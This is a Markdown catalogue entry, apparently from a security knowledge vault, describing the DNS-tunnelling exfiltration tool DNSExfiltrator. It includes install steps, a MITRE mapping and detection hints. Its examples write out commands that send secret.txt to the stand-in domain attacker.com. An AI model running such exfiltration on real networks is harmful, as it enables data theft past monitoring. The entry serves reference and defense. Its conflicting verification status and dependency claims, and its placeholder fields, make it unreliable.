---
id: 312d9a42-4556-4230-a931-d8697e3983d7
type: tool
verified: true
description: >-
  A tool for exfiltrating files over DNS covert channels, useful for data leak
  testing and bypassing network restrictions.
url: 'https://github.com/trimstray/dns-exfiltrator'
created_at: '2019-08-28T21:17:34.656427+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - exfiltration
  - dns-tunneling
  - covert-channel
  - data-leak
validated: true
---

# DNSExfiltrator

**Status**: Unverified

## Overview

DNSExfiltrator is a Python-based tool designed for exfiltrating data over DNS protocols, creating a covert channel for transferring files from a compromised host to an attacker-controlled server. It is commonly used in penetration testing to simulate data leaks through networks that block common exfiltration methods but allow DNS traffic.

## Description

The tool operates in client-server mode: the client encodes file data into DNS subdomain queries, while the server decodes and reconstructs the data from incoming DNS requests. This enables stealthy data transfer, as DNS queries often evade deep packet inspection. It supports binary file exfiltration and is lightweight, requiring only Python and standard libraries.

## Features

- Feature 1: Bidirectional DNS tunneling for file transfer
- Feature 2: Customizable domain and port for queries
- Feature 3: Chunked encoding to handle large files
- Feature 4: Server-side reconstruction with output to file

## Installation

### Requirements

- Python 3.x
- Scapy library (pip install scapy)

### Install Commands

```bash
# Clone the repository
git clone https://github.com/trimstray/dns-exfiltrator.git
cd dns-exfiltrator

# Install dependencies
pip install -r requirements.txt
```

## Basic Usage

```bash
python dns_exfiltrator.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -s, --server | Run in server mode to receive data |
| -c, --client | Run in client mode to send data |
| -f, --file | Specify file to exfiltrate (client only) |
| -p, --port | UDP port for DNS (default 53) |
| -d, --domain | Domain for queries (e.g., attacker.com) |

## Examples

### Example 1: Basic Usage

Start server:
```bash
python dns_exfiltrator.py -s -p 53 -d attacker.com
```

Exfiltrate file from client:
```bash
python dns_exfiltrator.py -c -f secret.txt -p 53 -d attacker.com
```

### Example 2: Advanced Usage

Server on custom port:
```bash
python dns_exfiltrator.py -s -p 1053 -d custom.attacker.com
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exfiltration Over Unencrypted Non-C2 Protocol]] DNS Tunneling

### Tactics

- [[Exfiltration]] Exfiltration

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Unusual volume of DNS queries to a single domain from internal hosts
- Detection method 2: Anomalous subdomain patterns in DNS logs (e.g., base64-encoded data)
- Detection method 3: Network monitoring for high-entropy DNS query names

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Related Tool 1]]
- [[Related Tool 2]]

## References

- Official GitHub: https://github.com/trimstray/dns-exfiltrator
- Related resources: DNS tunneling techniques in red teaming
